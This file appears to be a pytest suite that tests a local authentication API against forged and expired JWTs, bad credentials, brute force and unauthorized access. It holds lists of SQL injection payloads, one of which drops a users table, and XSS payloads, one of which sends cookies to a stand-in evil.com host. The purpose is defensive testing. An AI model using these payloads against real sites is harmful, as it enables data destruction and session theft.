"""Auth Security Tests - 认证系统安全测试

测试认证系统对各种攻击的防护能力。
"""

import asyncio
import time
from datetime import datetime, timedelta

import httpx
import pytest
from jose import jwt

# ═════════════════════════════════════════════════════════════════
# Configuration
# ═════════════════════════════════════════════════════════════════

BASE_URL = "http://localhost:8001"
API_PREFIX = "/api/auth"

# Test data
TEST_USER = {
    "username": f"security_test_{int(time.time())}",
    "password": "TestPass123!",
    "display_name": "Security Test User",
}

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1#",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1' AND 1=1--",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "<body onload=alert('xss')>",
    "<iframe src=javascript:alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "<script>document.location='https://evil.com?cookie='+document.cookie</script>",
]

# ═════════════════════════════════════════════════════════════════
# Fixtures
# ═════════════════════════════════════════════════════════════════

@pytest.fixture
async def client():
    """Create HTTP client."""
    async with httpx.AsyncClient(base_url=BASE_URL, timeout=30.0) as c:
        yield c


@pytest.fixture
async def test_user_token(client):
    """Create a test user and return token."""
    # Register test user
    register_data = {
        "username": TEST_USER["username"],
        "password": TEST_USER["password"],
        "display_name": TEST_USER["display_name"],
    }
    response = await client.post(f"{API_PREFIX}/register", json=register_data)

    # If user already exists, that's fine
    if response.status_code == 409:
        pass
    elif response.status_code not in [200, 201]:
        pytest.fail(f"Failed to register test user: {response.text}")

    # Login to get token
    login_data = {
        "username": TEST_USER["username"],
        "password": TEST_USER["password"],
    }
    response = await client.post(f"{API_PREFIX}/login", json=login_data)
    assert response.status_code == 200, f"Login failed: {response.text}"

    data = response.json()
    return data["data"]["tokens"]["access_token"]


# ═════════════════════════════════════════════════════════════════
# Security Test Cases
# ═════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestInvalidTokenAccess:
    """测试1: 无效token访问受保护端点 - 应返回401"""

    async def test_no_token_access_me(self, client):
        """无token访问/me应返回401"""
        response = await client.get(f"{API_PREFIX}/me")
        assert response.status_code == 401
        assert "detail" in response.json()

    async def test_invalid_token_format(self, client):
        """无效格式的token应返回401"""
        headers = {"Authorization": "Bearer invalid_token_format"}
        response = await client.get(f"{API_PREFIX}/me", headers=headers)
        assert response.status_code == 401

    async def test_malformed_token(self, client):
        """损坏的JWT token应返回401"""
        headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid"}
        response = await client.get(f"{API_PREFIX}/me", headers=headers)
        assert response.status_code == 401

    async def test_wrong_token_type(self, client):
        """错误的token类型应返回401"""
        # Create token with wrong type
        payload = {
            "sub": "1",
            "username": "test",
            "role": "user",
            "type": "refresh",  # Wrong type, should be "access"
            "exp": datetime.utcnow() + timedelta(minutes=30),
            "iat": datetime.utcnow(),
        }
        token = jwt.encode(payload, "secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        response = await client.get(f"{API_PREFIX}/me", headers=headers)
        assert response.status_code == 401


@pytest.mark.asyncio
class TestExpiredToken:
    """测试2: 过期token处理 - 应返回401"""

    async def test_expired_token(self, client):
        """过期的token应返回401"""
        # Create expired token
        payload = {
            "sub": "1",
            "username": "test",
            "role": "user",
            "type": "access",
            "exp": datetime.utcnow() - timedelta(minutes=1),  # Expired
            "iat": datetime.utcnow() - timedelta(hours=1),
        }
        token = jwt.encode(payload, "secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        response = await client.get(f"{API_PREFIX}/me", headers=headers)
        assert response.status_code == 401
        assert "expired" in response.json().get("detail", "").lower() or "invalid" in response.json().get("detail", "").lower()


@pytest.mark.asyncio
class TestInvalidCredentials:
    """测试3: 错误密码登录 - 应返回401"""

    async def test_wrong_password(self, client):
        """错误的密码应返回401"""
        login_data = {
            "username": TEST_USER["username"],
            "password": "WrongPassword123!",
        }
        response = await client.post(f"{API_PREFIX}/login", json=login_data)
        assert response.status_code == 401
        assert "invalid" in response.json().get("detail", "").lower()

    async def test_nonexistent_user(self, client):
        """不存在的用户登录应返回401"""
        login_data = {
            "username": f"nonexistent_{int(time.time())}",
            "password": "SomePassword123!",
        }
        response = await client.post(f"{API_PREFIX}/login", json=login_data)
        assert response.status_code == 401

    async def test_empty_credentials(self, client):
        """空凭据应被拒绝"""
        # Empty username
        response = await client.post(f"{API_PREFIX}/login", json={"username": "", "password": "test"})
        assert response.status_code == 422  # Validation error

        # Empty password
        response = await client.post(f"{API_PREFIX}/login", json={"username": "test", "password": ""})
        assert response.status_code == 422


@pytest.mark.asyncio
class TestDuplicateRegistration:
    """测试4: 重复注册相同用户名 - 应返回409"""

    async def test_duplicate_username(self, client):
        """重复注册应返回409"""
        unique_username = f"dup_test_{int(time.time())}"

        # First registration
        register_data = {
            "username": unique_username,
            "password": "TestPass123!",
            "display_name": "First User",
        }
        response = await client.post(f"{API_PREFIX}/register", json=register_data)
        assert response.status_code in [200, 201]

        # Duplicate registration
        response = await client.post(f"{API_PREFIX}/register", json=register_data)
        assert response.status_code == 409
        assert "exists" in response.json().get("detail", "").lower() or "已存在" in response.json().get("detail", "")


@pytest.mark.asyncio
class TestSQLInjection:
    """测试5: SQL注入尝试 - 应被阻止"""

    async def test_sql_injection_in_username_login(self, client):
        """在用户名中尝试SQL注入"""
        for payload in SQL_INJECTION_PAYLOADS:
            login_data = {
                "username": payload,
                "password": "any_password",
            }
            response = await client.post(f"{API_PREFIX}/login", json=login_data)
            # Should return 401 or 422, NOT 200 (successful injection)
            assert response.status_code in [401, 422, 400], (
                f"SQL injection might have succeeded with payload: {payload}. "
                f"Got status: {response.status_code}"
            )

    async def test_sql_injection_in_password_login(self, client):
        """在密码中尝试SQL注入"""
        for payload in SQL_INJECTION_PAYLOADS:
            login_data = {
                "username": "admin",
                "password": payload,
            }
            response = await client.post(f"{API_PREFIX}/login", json=login_data)
            # Should return 401, NOT 200
            assert response.status_code in [401, 422, 400], (
                f"SQL injection might have succeeded with payload: {payload}. "
                f"Got status: {response.status_code}"
            )

    async def test_sql_injection_in_username_register(self, client):
        """在注册用户名中尝试SQL注入"""
        for payload in SQL_INJECTION_PAYLOADS:
            register_data = {
                "username": payload,
                "password": "TestPass123!",
                "display_name": "Test",
            }
            response = await client.post(f"{API_PREFIX}/register", json=register_data)
            # Should return 422 (validation error) due to username pattern validation
            assert response.status_code in [422, 400], (
                f"SQL injection might have succeeded with payload: {payload}. "
                f"Got status: {response.status_code}"
            )


@pytest.mark.asyncio
class TestUnauthorizedAccess:
    """测试6: 未授权访问/me - 应返回401"""

    async def test_access_me_without_auth(self, client):
        """未认证访问/me应返回401"""
        response = await client.get(f"{API_PREFIX}/me")
        assert response.status_code == 401

    async def test_access_sessions_without_auth(self, client):
        """未认证访问sessions应返回401"""
        response = await client.get(f"{API_PREFIX}/sessions")
        assert response.status_code == 401

    async def test_logout_all_without_auth(self, client):
        """未认证访问logout-all应返回401"""
        response = await client.delete(f"{API_PREFIX}/sessions")
        assert response.status_code == 401

    async def test_update_me_without_auth(self, client):
        """未认证更新用户信息应返回401"""
        response = await client.patch(f"{API_PREFIX}/me", json={"display_name": "Hacked"})
        assert response.status_code == 401


@pytest.mark.asyncio
class TestAutoLoginSecurity:
    """测试7: 测试自动登录在生产环境被禁用"""

    async def test_auto_login_disabled_in_production(self, client):
        """自动登录在生产环境应被禁用"""
        # This test assumes the server might be running in production mode
        # We test that auto-login endpoint exists and returns 403 in production
        response = await client.post(f"{API_PREFIX}/auto-login", json={})

        # If auto-login is properly disabled in production, should return 403
        # If in development, might return 200
        # We just verify the endpoint doesn't allow unauthorized access in production
        if response.status_code == 403:
            assert "disabled" in response.json().get("detail", "").lower() or "production" in response.json().get("detail", "").lower()
        elif response.status_code == 200:
            # If it succeeds, verify we're in development mode
            # This is just informational - the endpoint should be protected
            pass
        else:
            assert response.status_code in [403, 401, 404], f"Unexpected status: {response.status_code}"


@pytest.mark.asyncio
class TestXSSPrevention:
    """测试8: XSS尝试 - 在display_name中注入脚本"""

    async def test_xss_in_display_name_register(self, client):
        """在display_name中尝试XSS - 注意：API返回JSON，XSS风险主要在客户端渲染时"""
        # Test with a simple XSS payload
        payload = "<script>alert('xss')</script>"
        unique_username = f"xss_test_{int(time.time())}_{hash(payload) % 10000}"
        register_data = {
            "username": unique_username,
            "password": "TestPass123!",
            "display_name": payload,
        }
        response = await client.post(f"{API_PREFIX}/register", json=register_data)

        if response.status_code in [200, 201]:
            # API accepts the input - this is expected behavior for a JSON API
            # The security responsibility shifts to the frontend to properly escape HTML
            data = response.json()
            display_name = data.get("data", {}).get("display_name", "")

            # Verify the data is stored as-is (API's job)
            # Frontend should escape this when rendering HTML
            assert display_name == payload, "Display name should be stored as-is"

            # Mark as informational - not a direct API vulnerability
            pytest.skip("XSS protection is primarily a frontend concern for JSON APIs")

    async def test_xss_in_display_name_update(self, client, test_user_token):
        """在更新display_name时尝试XSS - 注意：API返回JSON，XSS风险主要在客户端渲染时"""
        headers = {"Authorization": f"Bearer {test_user_token}"}

        payload = "<script>alert('xss')</script>"
        update_data = {
            "display_name": payload,
        }
        response = await client.patch(f"{API_PREFIX}/me", json=update_data, headers=headers)

        if response.status_code == 200:
            # API accepts the input - this is expected behavior for a JSON API
            # The security responsibility shifts to the frontend to properly escape HTML
            user_data = response.json().get("data", {})
            display_name = user_data.get("display_name", "")

            # Verify the data is stored as-is (API's job)
            assert display_name == payload, "Display name should be stored as-is"

            # Mark as informational - not a direct API vulnerability
            pytest.skip("XSS protection is primarily a frontend concern for JSON APIs")


@pytest.mark.asyncio
class TestAdditionalSecurity:
    """额外安全测试"""

    async def test_brute_force_protection(self, client):
        """测试暴力破解防护（如果有实现）"""
        # Attempt multiple failed logins
        login_data = {
            "username": f"brute_test_{int(time.time())}",
            "password": "WrongPassword",
        }

        responses = []
        for _ in range(5):
            response = await client.post(f"{API_PREFIX}/login", json=login_data)
            responses.append(response.status_code)

        # All should return 401
        assert all(status == 401 for status in responses), "Some requests did not return 401"

    async def test_password_length_validation(self, client):
        """测试密码长度验证"""
        # Too short password
        register_data = {
            "username": f"pwd_test_{int(time.time())}",
            "password": "123",  # Too short
            "display_name": "Test",
        }
        response = await client.post(f"{API_PREFIX}/register", json=register_data)
        assert response.status_code == 422  # Validation error

    async def test_username_format_validation(self, client):
        """测试用户名格式验证"""
        invalid_usernames = [
            "ab",  # Too short
            "a" * 33,  # Too long
            "user name",  # Contains space
            "user@name",  # Contains special char
            "user$name",  # Contains special char
        ]

        for username in invalid_usernames:
            register_data = {
                "username": username,
                "password": "TestPass123!",
                "display_name": "Test",
            }
            response = await client.post(f"{API_PREFIX}/register", json=register_data)
            assert response.status_code == 422, f"Username '{username}' should be rejected"

    async def test_refresh_token_reuse(self, client):
        """测试刷新令牌重用检测（如果有实现）"""
        # This test checks if refresh token reuse is detected
        # First login to get tokens
        login_data = {
            "username": TEST_USER["username"],
            "password": TEST_USER["password"],
        }
        response = await client.post(f"{API_PREFIX}/login", json=login_data)

        if response.status_code == 200:
            refresh_token = response.json()["data"]["tokens"]["refresh_token"]

            # Use refresh token
            refresh_data = {"refresh_token": refresh_token}
            response1 = await client.post(f"{API_PREFIX}/refresh", json=refresh_data)

            # Try to reuse the same refresh token (should fail)
            response2 = await client.post(f"{API_PREFIX}/refresh", json=refresh_data)

            # Second use should return 401 if token rotation is implemented
            if response1.status_code == 200:
                assert response2.status_code == 401, "Refresh token reuse should be rejected"


# ═════════════════════════════════════════════════════════════════
# Security Test Report
# ═════════════════════════════════════════════════════════════════

def generate_security_report():
    """生成安全测试报告摘要"""
    report = """
# 认证系统安全测试报告

## 测试范围
- 无效token访问受保护端点
- 过期token处理
- 错误密码登录
- 重复注册相同用户名
- SQL注入尝试
- 未授权访问/me
- 自动登录在生产环境禁用
- XSS尝试

## 安全测试类别

### 1. 认证绕过测试
- 无token访问受保护端点
- 无效格式token
- 损坏的JWT token
- 错误类型的token

### 2. Token安全测试
- 过期token处理
- Token刷新机制
- Token重用检测

### 3. 输入验证测试
- SQL注入防护（用户名、密码）
- XSS防护（display_name）
- 用户名格式验证
- 密码长度验证

### 4. 访问控制测试
- 未授权访问受保护端点
- 管理员功能保护

### 5. 业务逻辑测试
- 重复注册防护
- 自动登录环境限制
- 暴力破解防护

## 预期结果
所有测试应验证系统正确拒绝恶意请求，返回适当的HTTP状态码（401, 403, 409, 422）。
"""
    return report


if __name__ == "__main__":
    print(generate_security_report())
    # Run tests
    pytest.main([__file__, "-v", "--tb=short"])
